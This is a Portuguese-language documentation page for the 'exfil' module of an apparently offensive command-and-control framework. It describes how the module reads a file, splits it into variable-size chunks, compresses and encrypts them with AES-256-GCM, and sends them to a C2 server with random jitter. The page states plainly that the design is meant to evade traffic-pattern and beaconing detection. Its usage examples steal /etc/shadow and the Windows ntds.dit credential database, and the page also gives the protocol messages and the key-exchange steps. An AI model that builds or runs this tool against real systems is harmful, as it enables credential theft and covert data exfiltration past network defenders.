    Exfiltracao¶

    Modulo para exfiltracao segura de dados com chunking variavel, compressao, criptografia e jitter para evasao de deteccao de trafego.

    Resumo¶

    Modulo Plataformas Descricao
    exfil Windows, Linux, macOS Exfiltracao chunked com AES-256-GCM e jitter aleatorio

    exfil¶

    Nome: exfil Plataformas: Windows, Linux, macOS Descricao: Le um arquivo do disco, divide em chunks de tamanho variavel, comprime, criptografa com AES-256-GCM e envia para o servidor C2 com jitter aleatorio entre chunks.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    path string obrigatorio - Caminho do arquivo a exfiltrar
    compress string opcional false Se true, comprime cada chunk individualmente (zlib)

    Configuracao (ExfilConfig)¶

    A configuracao do modulo e definida via ExfilConfig:

    Campo Tipo Default Descricao
    MinChunkSize int 4 KB Tamanho minimo de chunk
    MaxChunkSize int 64 KB Tamanho maximo de chunk
    MinJitter duration 500 ms Jitter minimo entre chunks
    MaxJitter duration 3 s Jitter maximo entre chunks
    Compress bool true Comprimir dados antes de chunking
    EncryptionKey []byte - Chave de criptografia (se definida)
    ServerPubKey *ecdh.PublicKey - Chave publica ECDH do servidor (para key exchange)

    Retorno¶

    {
  "output": "exfiltrated /etc/shadow (3 chunks)",
  "data": {
    "status": "success",
    "sha256": "a1b2c3d4e5f6...",
    "total_chunks": "3"
  }
}

    Exemplo de uso¶

    # Exfiltrar arquivo
module exfil --path /etc/shadow

# Exfiltrar com compressao por chunk
module exfil --path "C:\Windows\NTDS\ntds.dit" --compress true

    Pipeline de Exfiltracao¶

    Arquivo -> Leitura -> SHA-256 -> [Compressao gzip] -> Chunking variavel ->
  Para cada chunk:
    [Compressao zlib per-chunk] -> AES-256-GCM -> Send -> Jitter aleatorio
    1. Leitura: arquivo inteiro e lido em memoria
    2. Hash: SHA-256 calculado sobre os dados originais (para verificacao de integridade)
    3. Compressao (opcional): gzip sobre os dados completos OU zlib por chunk individual
    4. Session key: chave AES-256 aleatoria gerada por sessao (crypto/rand)
    5. Chunking: divisao em chunks de tamanho aleatorio entre MinChunkSize e MaxChunkSize
    6. Session init: envia metadados (filename, total_chunks, sha256, session_key) via sendFunc
    7. Envio: cada chunk e criptografado com AES-256-GCM e enviado
    8. Jitter: espera aleatoria entre MinJitter e MaxJitter entre chunks
    9. Cleanup: session key e zerada em memoria (zeroKey())

    Protocolo¶

    Cada exfiltracao gera um session_id unico (16 bytes random, hex-encoded).

    Mensagem init: 

    {
  "action": "init",
  "session_id": "abc123...",
  "filename": "shadow",
  "total_chunks": 3,
  "total_bytes": 12288,
  "sha256": "d4e5f6...",
  "session_key": "aabbcc..."
}

    Mensagem chunk: 

    {
  "action": "chunk",
  "session_id": "abc123...",
  "chunk_index": 0,
  "total_chunks": 3,
  "data": "<AES-GCM encrypted>"
}

    Criptografia¶

    • Chunks: AES-256-GCM com nonce aleatorio (prepended ao ciphertext)
    • Session key: pode ser protegida via ECDH key exchange com o servidor:
      1. Gera keypair ECDH efemero (P-256)
      2. Realiza key agreement com a chave publica do servidor
      3. Deriva chave AES-256 via HKDF-SHA256 (info: wolfgang-exfil-v1)
      4. Criptografa session key com AES-256-GCM
      5. Envia: [len(ephemeral_pub)][ephemeral_pub][encrypted_session_key]

    Notas¶

    • O tamanho variavel dos chunks dificulta deteccao baseada em padroes de trafego
    • O jitter aleatorio evita deteccao de beaconing periodico
    • A compressao gzip e aplicada antes do chunking (reduz I/O); zlib per-chunk e aplicada depois
    • A session key e zerada apos o uso para evitar extracao de memoria
    • Cancelamento de contexto e verificado entre chunks
    • Para arquivos muito grandes, considerar o impacto de os.ReadFile na memoria
